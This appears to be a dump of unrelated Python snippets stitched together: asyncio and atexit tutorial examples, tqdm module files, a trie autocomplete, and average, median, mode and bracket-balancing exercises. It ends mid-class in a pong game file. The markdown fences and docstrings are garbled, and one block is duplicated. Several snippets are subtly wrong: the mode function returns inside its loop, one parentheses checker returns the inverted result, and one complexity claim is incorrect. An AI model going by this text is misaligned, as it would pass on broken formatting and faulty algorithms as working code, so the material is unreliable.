    # Make the threshold for "slow" tasks very very small for
    # illustration. The default is 0.1, or 100 milliseconds.
    event_loop.slow_callback_duration = 0.001

    # Report all mistakes managing asynchronous resources.
    warnings.simplefilter("always", ResourceWarning)

LOG.info("entering event loop")
event_loop.run_until_complete(outer(event_loop))

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyEcho client using coroutines```


```py

# end_pymotw_header
import asyncio
import logging
import sys

MESSAGES = [b"This is the message. ", b"It will be sent ", b"in parts."]
SERVER_ADDRESS = ("localhost", 10000)


async def echo_client(address, messages):

    log = logging.getLogger("echo_client")

    log.debug("connecting to {} port {}".format(*address))
    reader, writer = await asyncio.open_connection(*address)

    # This could be writer.writelines() except that
    # would make it harder to show each part of the message
    # being sent.
    for msg in messages:
        writer.write(msg)
        log.debug("sending {!r}".format(msg))
    if writer.can_write_eof():
        writer.write_eof()
    await writer.drain()

    log.debug("waiting for response")
    while True:
        data = await reader.read(128)
        if data:
            log.debug("received {!r}".format(data))
        else:
            log.debug("closing")
            writer.close()
            return


logging.basicConfig(
    level=logging.DEBUG, format="%(name)s: %(message)s", stream=sys.stderr
)
log = logging.getLogger("main")

event_loop = asyncio.get_event_loop()

try:
    event_loop.run_until_complete(echo_client(SERVER_ADDRESS, MESSAGES))
finally:
    log.debug("closing event loop")
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyCreating a Future with ensure_future```


```py

# end_pymotw_header
import asyncio


async def wrapped():
    print("wrapped")
    return "result"


async def inner(task):
    print("inner: starting")
    print("inner: waiting for {!r}".format(task))
    result = await task
    print("inner: task returned {!r}".format(result))


async def starter():
    print("starter: creating task")
    task = asyncio.ensure_future(wrapped())
    print("starter: waiting for inner")
    await inner(task)
    print("starter: inner returned")


event_loop = asyncio.get_event_loop()
try:
    print("entering event loop")
    result = event_loop.run_until_complete(starter())
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyUsing an event primitive```


```py

# end_pymotw_header
import asyncio
import functools


def set_event(event):
    print("setting event in callback")
    event.set()


async def coro1(event):
    print("coro1 waiting for event")
    await event.wait()
    print("coro1 triggered")


async def coro2(event):
    print("coro2 waiting for event")
    await event.wait()
    print("coro2 triggered")


async def main(loop):
    # Create a shared event
    event = asyncio.Event()
    print("event start state: {}".format(event.is_set()))

    loop.call_later(0.1, functools.partial(set_event, event))

    await asyncio.wait([coro1(event), coro2(event)])
    print("event end state: {}".format(event.is_set()))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyRunning a blocking function in a thread pool```


```py

# end_pymotw_header
import asyncio
import concurrent.futures
import logging
import sys
import time


def blocks(n):
    log = logging.getLogger("blocks({})".format(n))
    log.info("running")
    time.sleep(0.1)
    log.info("done")
    return n ** 2


async def run_blocking_tasks(executor):
    log = logging.getLogger("run_blocking_tasks")
    log.info("starting")

    log.info("creating executor tasks")
    loop = asyncio.get_event_loop()
    blocking_tasks = [loop.run_in_executor(executor, blocks, i) for i in range(6)]
    log.info("waiting for executor tasks")
    completed, pending = await asyncio.wait(blocking_tasks)
    results = [t.result() for t in completed]
    log.info("results: {!r}".format(results))

    log.info("exiting")


if __name__ == "__main__":
    # Configure logging to show the name of the thread
    # where the log message originates.
    logging.basicConfig(
        level=logging.INFO,
        format="%(threadName)10s %(name)18s: %(message)s",
        stream=sys.stderr,
    )

    # Create a limited thread pool.
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=3)

    event_loop = asyncio.get_event_loop()
    try:
        event_loop.run_until_complete(run_blocking_tasks(executor))
    finally:
        event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyWaiting for a future to be done```


```py

# end_pymotw_header
import asyncio


def mark_done(future, result):
    print("setting future result to {!r}".format(result))
    future.set_result(result)


async def main(loop):
    all_done = asyncio.Future()

    print("scheduling mark_done")
    loop.call_soon(mark_done, all_done, "the result")

    result = await all_done
    print("returned result: {!r}".format(result))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyFuture callbacks```


```py

# end_pymotw_header
import asyncio
import functools


def callback(future, n):
    print("{}: future done: {}".format(n, future.result()))


async def register_callbacks(all_done):
    print("registering callbacks on future")
    all_done.add_done_callback(functools.partial(callback, n=1))
    all_done.add_done_callback(functools.partial(callback, n=2))


async def main(all_done):
    await register_callbacks(all_done)
    print("setting result of future")
    all_done.set_result("the result")


event_loop = asyncio.get_event_loop()
try:
    all_done = asyncio.Future()
    event_loop.run_until_complete(main(all_done))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyWaiting for a future to be done```


```py

# end_pymotw_header
import asyncio


def mark_done(future, result):
    print("setting future result to {!r}".format(result))
    future.set_result(result)


event_loop = asyncio.get_event_loop()
try:
    all_done = asyncio.Future()

    print("scheduling mark_done")
    event_loop.call_soon(mark_done, all_done, "the result")

    print("entering event loop")
    result = event_loop.run_until_complete(all_done)
    print("returned result: {!r}".format(result))
finally:
    print("closing event loop")
    event_loop.close()

print("future result: {!r}".format(all_done.result()))

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyCollecting output from tasks in parallel```


```py

# end_pymotw_header
import asyncio


async def phase1():
    print("in phase1")
    await asyncio.sleep(2)
    print("done with phase1")
    return "phase1 result"


async def phase2():
    print("in phase2")
    await asyncio.sleep(1)
    print("done with phase2")
    return "phase2 result"


async def main():
    print("starting main")
    print("waiting for phases to complete")
    results = await asyncio.gather(phase1(), phase2())
    print("results: {!r}".format(results))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main())
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyUsing generators instead of coroutines```


```py

# end_pymotw_header
import asyncio


@asyncio.coroutine
def outer():
    print("in outer")
    print("waiting for result1")
    result1 = yield from phase1()
    print("waiting for result2")
    result2 = yield from phase2(result1)
    return (result1, result2)


@asyncio.coroutine
def phase1():
    print("in phase1")
    return "result1"


@asyncio.coroutine
def phase2(arg):
    print("in phase2")
    return "result2 derived from {}".format(arg)


event_loop = asyncio.get_event_loop()
try:
    return_value = event_loop.run_until_complete(outer())
    print("return value: {!r}".format(return_value))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyConverting hostnames to IP addresses```


```py

# end_pymotw_header
import asyncio
import logging
import socket
import sys


TARGETS = [
    ("pymotw.com", "https"),
    ("doughellmann.com", "https"),
    ("python.org", "https"),
]


async def main(loop, targets):
    for target in targets:
        info = await loop.getaddrinfo(*target, proto=socket.IPPROTO_TCP)

        for host in info:
            print("{:20}: {}".format(target[0], host[4][0]))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop, TARGETS))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyIP addresses and port numbers to host and protocol names```


```py

# end_pymotw_header
import asyncio
import logging
import socket
import sys


TARGETS = [("66.33.211.242", 443), ("104.130.43.121", 443)]


async def main(loop, targets):
    for target in targets:
        info = await loop.getnameinfo(target)
        print("{:15}: {} {}".format(target[0], *info))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop, TARGETS))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyUsing a lock primitive```


```py

# end_pymotw_header
import asyncio
import functools


def unlock(lock):
    print("callback releasing lock")
    lock.release()


async def coro1(lock):
    print("coro1 waiting for the lock")
    async with lock:
        print("coro1 acquired lock")
    print("coro1 released lock")


async def coro2(lock):
    print("coro2 waiting for the lock")
    await lock.acquire()
    try:
        print("coro2 acquired lock")
    finally:
        print("coro2 released lock")
        lock.release()


async def main(loop):
    # Create and acquire a shared lock.
    lock = asyncio.Lock()
    print("acquiring the lock before starting coroutines")
    await lock.acquire()
    print("lock acquired: {}".format(lock.locked()))

    # Schedule a callback to unlock the lock.
    loop.call_later(0.1, functools.partial(unlock, lock))

    # Run the coroutines that want to use the lock.
    print("waiting for coroutines")
    await asyncio.wait([coro1(lock), coro2(lock)]),


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyHandling UNIX signals```


```py

# end_pymotw_header
import asyncio
import functools
import os
import signal


def signal_handler(name):
    print("signal_handler({!r})".format(name))


event_loop = asyncio.get_event_loop()

event_loop.add_signal_handler(
    signal.SIGHUP, functools.partial(signal_handler, name="SIGHUP")
)
event_loop.add_signal_handler(
    signal.SIGUSR1, functools.partial(signal_handler, name="SIGUSR1")
)
event_loop.add_signal_handler(
    signal.SIGINT, functools.partial(signal_handler, name="SIGINT")
)


async def send_signals():
    pid = os.getpid()
    print("starting send_signals for {}".format(pid))

    for name in ["SIGHUP", "SIGHUP", "SIGUSR1", "SIGINT"]:
        print("sending {}".format(name))
        os.kill(pid, getattr(signal, name))
        # Yield control to allow the signal handler to run,
        # since the signal does not interrupt the program
        # flow otherwise.
        print("yielding control")
        await asyncio.sleep(0.01)
    return


try:
    event_loop.run_until_complete(send_signals())
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyStopping the event loop```


```py

# end_pymotw_header
import asyncio
import logging
import sys

logging.basicConfig(
    level=logging.DEBUG, format="%(name)s: %(message)s", stream=sys.stderr
)
LOG = logging.getLogger("main")


async def stopper(loop):
    LOG.debug("stopper invoked")
    loop.stop()


event_loop = asyncio.get_event_loop()

event_loop.create_task(stopper(event_loop))

try:
    LOG.debug("entering event loop")
    event_loop.run_forever()
finally:
    LOG.debug("closing event loop")
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyCommunicating with a subprocess using coroutines```


```py

# end_pymotw_header
import asyncio
import asyncio.subprocess


async def to_upper(input):
    print("in to_upper")

    create = asyncio.create_subprocess_exec(
        "tr",
        "[:lower:]",
        "[:upper:]",
        stdout=asyncio.subprocess.PIPE,
        stdin=asyncio.subprocess.PIPE,
    )
    print("launching process")
    proc = await create
    print("pid {}".format(proc.pid))

    print("communicating with process")
    stdout, stderr = await proc.communicate(input.encode())

    print("waiting for process to complete")
    await proc.wait()

    return_code = proc.returncode
    print("return code {}".format(return_code))
    if not return_code:
        results = bytes(stdout).decode()
    else:
        results = ""

    return (return_code, results)


MESSAGE = """
This message will be converted
to all caps.```


```py

event_loop = asyncio.get_event_loop()
try:
    return_code, results = event_loop.run_until_complete(to_upper(MESSAGE))
finally:
    event_loop.close()

if return_code:
    print("error exit {}".format(return_code))
else:
    print("Original: {!r}".format(MESSAGE))
    print("Changed : {!r}".format(results))

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyWaiting for multiple coroutines```


```py

# end_pymotw_header
import asyncio


async def phase(i):
    print("in phase {}".format(i))
    await asyncio.sleep(0.1 * i)
    print("done with phase {}".format(i))
    return "phase {} result".format(i)


async def main(num_phases):
    print("starting main")
    phases = [phase(i) for i in range(num_phases)]
    print("waiting for phases to complete")
    completed, pending = await asyncio.wait(phases)
    results = [t.result() for t in completed]
    print("results: {!r}".format(results))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(3))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyWaiting for multiple coroutines, with a timeout```


```py

# end_pymotw_header
import asyncio


async def phase(i):
    print("in phase {}".format(i))
    try:
        await asyncio.sleep(0.1 * i)
    except asyncio.CancelledError:
        print("phase {} canceled".format(i))
        raise
    else:
        print("done with phase {}".format(i))
        return "phase {} result".format(i)


async def main(num_phases):
    print("starting main")
    phases = [phase(i) for i in range(num_phases)]
    print("waiting 0.1 for phases to complete")
    completed, pending = await asyncio.wait(phases, timeout=0.1)
    print("{} completed and {} pending".format(len(completed), len(pending)))
    # Cancel remaining tasks so they do not generate errors
    # as we exit without finishing them.
    if pending:
        print("canceling tasks")
        for t in pending:
            t.cancel()
    print("exiting main")


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(3))
finally:
    event_loop.close()

#!/usr/bin/env python3```


```pyUsing atexit.register as a decorator.```


```py
# end_pymotw_header
import atexit


@atexit.register
def all_done():
    print("all_done()")


print("starting main program")

#!/usr/bin/env python3```


```pyIf an exception is raised in an atexit callback, it is
printed to the console.
````

````py
# end_pymotw_header
import atexit


def exit_with_exception(message):
    raise RuntimeError(message)


atexit.register(exit_with_exception, "Registered first")
atexit.register(exit_with_exception, "Registered second")

#!/usr/bin/env python3```


```pyatexit functions are still called when a KeyboardInterrupt is
received.
````

````py
# end_pymotw_header
import atexit
import sys


def is_called():
    print("The atexit handlers are still called")


atexit.register(is_called)

sys.stdout.write("Press Ctrl-C now")
sys.stdout.flush()

ignored = sys.stdin.readline()

#!/usr/bin/env python3```


```pyRegister repeatedly with different arguments.```


```py

# end_pymotw_header
import atexit


def my_cleanup(name):
    print("my_cleanup({})".format(name))


atexit.register(my_cleanup, "first")
atexit.register(my_cleanup, "second")
atexit.register(my_cleanup, "third")

#!/usr/bin/env python3```


```pyatexit callbacks are not invoked if we bypass normal exit and
cleanup.
````

````py

# end_pymotw_header
import atexit
import os


def not_called():
    print("This should not be called")


print("Registering")
atexit.register(not_called)
print("Registered")

print("Exiting...")
os._exit(0)

#!/usr/bin/env python3```


```pyChild process in signal example.```


```py

# end_pymotw_header
import atexit
import time
import sys


def not_called():
    print("CHILD: atexit handler should not have been called")


print("CHILD: Registering atexit handler")
sys.stdout.flush()
atexit.register(not_called)

print("CHILD: Pausing to wait for signal")
sys.stdout.flush()
time.sleep(5)

#!/usr/bin/env python3```


```pySend a signal to a child process, killing it, to illustrate
that the atexit handlers are not called.
````

````py

# end_pymotw_header
import os
import signal
import subprocess
import time

proc = subprocess.Popen("./atexit_signal_child.py")
print("PARENT: Pausing before sending signal...")
time.sleep(1)
print("PARENT: Signaling child")
os.kill(proc.pid, signal.SIGTERM)

#!/usr/bin/env python3```


```pySimple atexit example.```


```py

# end_pymotw_header
import atexit


def all_done():
    print("all_done()")


print("Registering")
atexit.register(all_done)
print("Registered")

#!/usr/bin/env python3```









---


```py


# end_pymotw_header
import atexit
import sys


def all_done():
    print("all_done()")


print("Registering")
atexit.register(all_done)
print("Registered")

print("Exiting...")
sys.exit()

#!/usr/bin/env python3```


```pyCancel registered callback```


```py
# end_pymotw_header
import atexit


def my_cleanup(name):
    print("my_cleanup({})".format(name))


atexit.register(my_cleanup, "first")
atexit.register(my_cleanup, "second")
atexit.register(my_cleanup, "third")

atexit.unregister(my_cleanup)

#!/usr/bin/env python3```


```pyCancel registered callback```


```py
# end_pymotw_header
import atexit


def my_cleanup(name):
    print("my_cleanup({})".format(name))


if False:
    atexit.register(my_cleanup, "never registered")

atexit.unregister(my_cleanup)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class MyObject(object):
    def __init__(self):
        self.x = 9

    def power(self):
        return self.x * self.x


obj = MyObject()

print("hasattr(obj, 'x') =", hasattr(obj, "x"))  # 'x'？
print("hasattr(obj, 'y') =", hasattr(obj, "y"))  # 'y'？
setattr(obj, "y", 19)  # 'y'
print("hasattr(obj, 'y') =", hasattr(obj, "y"))  # 'y'？
print("getattr(obj, 'y') =", getattr(obj, "y"))  # 'y'
print("obj.y =", obj.y)  # 'y'

print("getattr(obj, 'z') =", getattr(obj, "z", 404))  # 'z'，，404

f = getattr(obj, "power")  # 'power'
print(f)
print(f())

import PyPDF2
import pyttsx3

book = open(input("Enter the book name: "), "rb")
pg_no = int(
    input(
        "Enter the page number from which you want the system to start reading text: "
    )
)

pdf_Reader = PyPDF2.PdfFileReader(book)
pages = pdf_Reader.numPages

speaker = pyttsx3.init()

for num in range((pg_no - 1), pages):
    page = pdf_Reader.getPage(num)
    text = page.extractText()
    speaker.say(text)
    speaker.runAndWait()
````

````py
Enables multiple commonly used features.

Method resolution order:

- `tqdm.autonotebook` without import warnings
- `tqdm.asyncio` on Python3.6+
- `tqdm.std` base class

Usage:
>>> from tqdm.auto import trange, tqdm
>>> for i in trange(10):
...     ...```


```py
import sys
import warnings

from .std import TqdmExperimentalWarning

with warnings.catch_warnings():
    warnings.simplefilter("ignore", category=TqdmExperimentalWarning)
    from .autonotebook import tqdm as notebook_tqdm
    from .autonotebook import trange as notebook_trange

if sys.version_info[:2] < (3, 6):
    tqdm = notebook_tqdm
    trange = notebook_trange
else:  # Python3.6+
    from .asyncio import tqdm as asyncio_tqdm
    from .std import tqdm as std_tqdm

    if notebook_tqdm != std_tqdm:

        class tqdm(notebook_tqdm, asyncio_tqdm):  # pylint: disable=inconsistent-mro
            pass

    else:
        tqdm = asyncio_tqdm

    def trange(*args, **kwargs):
        """
        A shortcut for `tqdm.auto.tqdm(range(*args), **kwargs)`.
        """
        return tqdm(range(*args), **kwargs)


__all__ = ["tqdm", "trange"]

END = "#"


class Trie:
    def __init__(self):
        self._trie = {}

    def insert_word(self, text):
        trie = self._trie
        for char in text:
            if char not in trie:
                trie[char] = {}
            trie = trie[char]
        trie[END] = True

    def find_word(self, prefix):
        trie = self._trie
        for char in prefix:
            if char in trie:
                trie = trie[char]
            else:
                return []
        return self._elements(trie)

    def _elements(self, d):
        result = []
        for c, v in d.items():
            if c == END:
                sub_result = [" "]
            else:
                sub_result = [c + s for s in self._elements(v)]
            result.extend(sub_result)
        return tuple(result)


trie = Trie()
words = ("depart", "detergent", "daring", "dog", "deer", "deal")
for word in words:
    trie.insert_word(word)


def autocomplete_using_trie(s):
    """
    >>> trie = Trie()
    >>> for word in words:
    ...     trie.insert_word(word)
    ...
    >>> matches = autocomplete_using_trie("de")

    "detergent " in matches
    True
    "dog " in matches
    False
    """
    suffixes = trie.find_word(s)
    return tuple(s + w for w in suffixes)


def main():
    print(autocomplete_using_trie("de"))


if __name__ == "__main__":
    main()
````

````py
Automatically choose between `tqdm.notebook` and `tqdm.std`.

Usage:
>>> from tqdm.autonotebook import trange, tqdm
>>> for i in trange(10):
...     ...```


```py
import os
import sys

try:
    get_ipython = sys.modules["IPython"].get_ipython
    if "IPKernelApp" not in get_ipython().config:  # pragma: no cover
        raise ImportError("console")
    if "VSCODE_PID" in os.environ:  # pragma: no cover
        raise ImportError("vscode")
except Exception:
    from .std import tqdm, trange
else:  # pragma: no cover
    from warnings import warn

    from .notebook import tqdm, trange
    from .std import TqdmExperimentalWarning

    warn(
        "Using `tqdm.autonotebook.tqdm` in notebook mode."
        " Use `tqdm.tqdm` instead to force console mode"
        " (e.g. in jupyter console)",
        TqdmExperimentalWarning,
        stacklevel=2,
    )
__all__ = ["tqdm", "trange"]

import python_avatars as pa

# customising avtaar as per requirement
pa.Avatar(
    # selecting the back ground shape
    style=pa.AvatarStyle.CIRCLE,
    # selecting the face parts
    eyebrows=pa.EyebrowType.DEFAULT_NATURAL,
    eyes=pa.EyeType.HEART,
    nose=pa.NoseType.DEFAULT,
    mouth=pa.MouthType.EATING,
    facial_hair=pa.FacialHairType.NONE,
    # selecting bg shape colour
    background_color="#FF00FF",
    # Choose graphic shirt
    clothing=pa.ClothingType.GRAPHIC_SHIRT,
    clothing_color=pa.ClothingColor.GRAY_02,
    # Important to choose this as shirt_graphic, otherwise shirt_text will be ignored
    shirt_graphic=pa.ClothingGraphic.CUSTOM_TEXT,
    shirt_text="Chess"
    # finally saving the avtaar
).render("avatar_text.svg")

# Source : https://leetcode.com/problems/average-of-levels-in-binary-tree/description/

# Date   : 2017-12-26

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def averageOfLevels(self, root):
        """
        :type root: TreeNode
        :rtype: List[float]
        """
        root.level = 0
        q = [root]
        ans = []
        sum, num, curLevel = 0, 0, 0

        while len(q):
            item = q[0]
            del q[0]
            if item.level == curLevel:
                sum += item.val
                num += 1
            else:
                ans.append(sum / num)
                curLevel += 1
                sum = item.val
                num = 1

            if item.left:
                item.left.level = item.level + 1
                q.append(item.left)
            if item.right:
                item.right.level = item.level + 1
                q.append(item.right)

        ans.append(sum / num)
        return ans
````

```py
Aim: To calculate average of all the distinct integers.
```

```py


def average(array):
    # getting all unique numbers
    p = set(array)
    # calculating the total number of elements
    s = len(p)
    # computing the average
    ans = sum(p) / s
    # printing the result
    print("Average is:", ans)


# getting the input
arr = input("Enter numbers: ").strip().split()
# converting elements into integer type for calculating average
arr_int = []
for i in arr:
    arr_int.append(int(i))
# calling function to compute the average
average(arr_int)
```

```py
COMPLEXITY:

  Time Complexity -> O(1)
  Space Complexity -> O(N)

Sample Input:
Enter numbers: 5 3 1 2 3 4 5

Sample Output:
Average is: 3.0

Explanation:
All unique integers --> 1 2 3 4 5
Total count --> 5
Average --> (1+2+3+4+5)/5 = 3.0
```

```py

```

````pyFind mean of a list of numbers."""


def average(nums):
    """Find mean of a list of numbers."""
    return sum(nums) / len(nums)


def test_average():
    """
    >>> test_average()
    """
    assert 12.0 == average([3, 6, 9, 12, 15, 18, 21])
    assert 20 == average([5, 10, 15, 20, 25, 30, 35])
    assert 4.5 == average([1, 2, 3, 4, 5, 6, 7, 8])


if __name__ == "__main__":
    """Call average module to find mean of a specific list of numbers."""
    print(average([2, 4, 6, 8, 20, 50, 70]))

def median(nums):
    """
    Find median of a list of numbers.

    >>> median([0])
    0
    >>> median([4,1,3,2])
    2.5
    >>> median([2, 70, 6, 50, 20, 8, 4])
    8

    Args:
        nums: List of nums

    Returns:
        Median.
    """
    sorted_list = sorted(nums)
    length = len(sorted_list)
    mid_index = length >> 1
    return (
        (sorted_list[mid_index] + sorted_list[mid_index - 1]) / 2
        if length % 2 == 0
        else sorted_list[mid_index]
    )


def main():
    import doctest

    doctest.testmod()


if __name__ == "__main__":
    main()

import statistics


def mode(input_list):  # Defining function "mode."
    """This function returns the mode(Mode as in the measures of
    central tendency) of the input data.

    The input list may contain any Datastructure or any Datatype.

    >>> input_list = [2, 3, 4, 5, 3, 4, 2, 5, 2, 2, 4, 2, 2, 2]
    >>> mode(input_list)
    2
    >>> input_list = [2, 3, 4, 5, 3, 4, 2, 5, 2, 2, 4, 2, 2, 2]
    >>> mode(input_list) == statistics.mode(input_list)
    True
    """
    # Copying input_list to check with the index number later.
    check_list = input_list.copy()
    result = list()  # Empty list to store the counts of elements in input_list
    for x in input_list:
        result.append(input_list.count(x))
        input_list.remove(x)
        y = max(result)  # Gets the maximum value in the result list.
        # Returns the value with the maximum number of repetitions.
        return check_list[result.index(y)]


if __name__ == "__main__":
    data = [2, 3, 4, 5, 3, 4, 2, 5, 2, 2, 4, 2, 2, 2]
    print(mode(data))
    print(statistics.mode(data))

# average of sum of lists
m = [1, 43, 656, 8, 54, 908, 4, 5, 23, 78, 435, 89, 45, 476, 89]
n = [234, 56, 90, 675, 56, 786, 90, 564, 8, 657, 87, 64, 354, 2, 75]
q = [34, 76, 76, 564, 34, 32, 16, 67, 25, 98, 90, 345, 235, 64, 134, 76]


def avgSums(a, b, c):
    summingUp = sum(a) + sum(b) + sum(c)
    summed = summingUp / 3
    return summed


print(avgSums(m, n, q))
# [Running] python -u "c:\0-a-A-October\00-weeks\08-my-website\Stable\Public\2-content\Data-Structures\DS-and-Algorithms-Prac\DS-n-Algos\Arrays\python\sum-avg\avg.py"
# 2892.6666666666665
#
# [Done] exited with code=0 in 0.186 seconds

fh = open("mbox-short.txt")
# The 'mbox-short.txt' file can be downloaded from the link: https://www.py4e.com/code3/mbox-short.txt
sum = 0
count = 0
for fx in fh:
    fx = fx.rstrip()
    if not fx.startswith("X-DSPAM-Confidence:"):
        continue
    fy = fx[19:]
    count = count + 1
    sum = sum + float(fy)
print("Average spam confidence: ", sum / count)

def avoidObstacles(inputArray):

    for i in range(1, max(inputArray)):
        divs = any([x for x in inputArray if not x % i])
        if not divs:
            return i

    return max(inputArray) + 1

def avoidObstacles(inputArray):
    sortedlist = sorted(inputArray)  # Sort list in ascending order
    jump_dist = 1  # Set jump distance to 1 initially
    obstacle_hit = True  # Flag to check if current jump distance hit an obstacle

    while obstacle_hit:
        obstacle_hit = False  # Set flag to false as we check next jump distance
        jump_dist += (
            1
        )  # Increment jump distance as we check if next value hits no obstacles
        # Check if jumping with current length hits an obstacle
        for i in range(len(sortedlist)):
            if sortedlist[i] % jump_dist == 0:
                obstacle_hit = True
                break
    return jump_dist

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
print("running {}".format(__file__))
````

```pyA matplotlib backend for publishing figures via display_data"""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import warnings

from matplotlib_inline.backend_inline import *  # analysis: ignore


warnings.warn(
    "`ipykernel.pylab.backend_inline` is deprecated, directly "
    "use `matplotlib_inline.backend_inline`",
    DeprecationWarning,
)
```

````py
ID: ebd60a5b-403f-4eac-a651-8a9a52c2b11c

Useful with Dijkstra's when you want the path. This version assumes all the keys you need are there,
but you could use .get() instead.```


```py
from collections.abc import Mapping
from typing import Optional

from src.typehints import Node


def backpedal(goal: Node, parents: Mapping[Node, Optional[Node]]) -> list[Node]:
    """With a dict of parent->child, walk backwards from the goal as far as possible and return the path."""
    back_path = []
    node = goal
    while node is not None:
        back_path.append(node)
        node = parents[node]
    return back_path[::-1]
````

````py
ID: ebd60a5b-403f-4eac-a651-8a9a52c2b11c

Useful with Dijkstra's when you want the path. This version assumes all the keys you need are there,
but you could use .get() instead.```


```py
from collections.abc import Mapping
from typing import Optional

from src.typehints import Node


def backpedal(goal: Node, parents: Mapping[Node, Optional[Node]]) -> list[Node]:
    """With a dict of parent->child, walk backwards from the goal as far as possible and return the path."""
    back_path = []
    node = goal
    while node is not None:
        back_path.append(node)
        node = parents[node]
    return back_path[::-1]
````

```py
Aim: Read a string, S and print its integer value. If S cannot be converted to
an integer, print Bad String.
```

```py

# getting the input
S = input().strip()
try:
    # if it's possible to convert the entered string into an integer then this block will execute
    print(int(S))
except:
    # if it's not possible, then this block will be executed
    print("Bad String")
```

```py
COMPLEXITY:

  Time Complexity -> O(1)
  Space Complexity -> O(1)

Sample Input 1:
3
Sample Output 1:
3
Sample Input 2:
SB
Sample Output 2:
Bad String

Explaination:
'3' as a string can be converted into the integer 3, whereas SB can't be
converted to an integer hence the 'except' block is executed and 'Bad String'
is printed.
```

```py

```

````py
Given a string containing only three types of characters: '(', ')' and '*', write a function to check whether this string is valid. We define the validity of a string by these rules:

Any left parenthesis '(' must have a corresponding right parenthesis ')'.
Any right parenthesis ')' must have a corresponding left parenthesis '('.
Left parenthesis '(' must go before the corresponding right parenthesis ')'.
'*' could be treated as a single right parenthesis ')' or a single left parenthesis '(' or an empty string.
An empty string is also valid.```


```py


def checkValidString(s):
    """
    TimeComplexity: O(n)
    SpaceComplexity: O(1)
    """
    used_stars = 0
    unused_stars = 0
    open_p = 0
    for p in s:
        if p == "(":
            open_p += 1
        elif p == "*":
            if open_p:
                open_p -= 1
                used_stars += 1
            else:
                unused_stars += 1
        else:
            if open_p:
                open_p -= 1
            elif unused_stars:
                unused_stars -= 1
            elif used_stars:
                unused_stars += 1
                used_stars -= 1
            else:
                return False
    return open_p == 0


print(checkValidString("(())((())()()(*)(*()(())())())()()((()())((()))(*"))

class Stack:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def pop(self):
        return self.items.pop()

    def is_empty(self):
        return self.items == []

    def peek(self):
        return self.items[-1]

    def display(self):
        return self.items


def is_same(p1, p2):
    if p1 == "(" and p2 == ")":
        return True
    elif p1 == "[" and p2 == "]":
        return True
    elif p1 == "{" and p2 == "}":
        return True
    else:
        return False


def is_balanced(check_string):
    s = Stack()
    index = 0
    is_bal = True
    while index < len(check_string) and is_bal:
        paren = check_string[index]
        if paren in "{[(":
            s.push(paren)
        else:
            if s.is_empty():
                is_bal = False
            else:
                top = s.pop()
                if not is_same(top, paren):
                    is_bal = False
        index += 1

    if s.is_empty() and is_bal:
        return True
    else:
        return False


print(is_balanced("[((())})]"))

def balance(arr):
    open_bracket = ["[", "{", "("]
    close_bracket = ["]", "}", ")"]
    stack = []
    for i in arr:
        if i in open_bracket:
            stack.append(i)
        elif i in close_bracket:
            pos = close_bracket.index(i)
            if len(stack) >= 0 and (open_bracket[pos] == stack[len(stack) - 1]):
                stack.pop()
            else:
                return "unbalanced"
    if len(stack) == 0:
        return "balanced"
    else:
        return "unbalanced"


arr = ["{", "[", "]", "}"]
print(balance(arr))

# Use a dictionary to map sets of brackets to their opposites
brackets = {"(": ")", "{": "}", "[": "]"}

# On each input string, process it using the balance checker
def balancedBrackets(string):
    stack = []
    # Process every character on input
    for char in string:
        # Assign an initial value in case the stack is empty
        last = 0
        # Assign the value of the last element if stack is not empty
        if stack:
            last = stack[len(stack) - 1]
        if stack and last in brackets and brackets[last] == char:
            stack.pop()
        else:
            stack.append(char)

    return not stack

from __future__ import print_function
from __future__ import absolute_import
from .Stack import Stack

__author__ = "Omkar Pathak"


def balanced_parentheses(parentheses):
    """ Use a stack to check if a string of parentheses are balanced."""
    stack = Stack(len(parentheses))
    for parenthesis in parentheses:
        if parenthesis == "(":
            stack.push(parenthesis)
        elif parenthesis == ")":
            stack.pop()
    return not stack.is_empty()


if __name__ == "__main__":
    examples = ["((()))", "((())"]
    print("Balanced parentheses demonstration:\n")
    for example in examples:
        print(example + ": " + str(balanced_parentheses(example)))

# ./PongPong/pong/ball.py

import pyglet
import random
from typing import Tuple


class BallObject(pyglet.shapes.Circle):
    def __init__(self, *args, **kwargs):
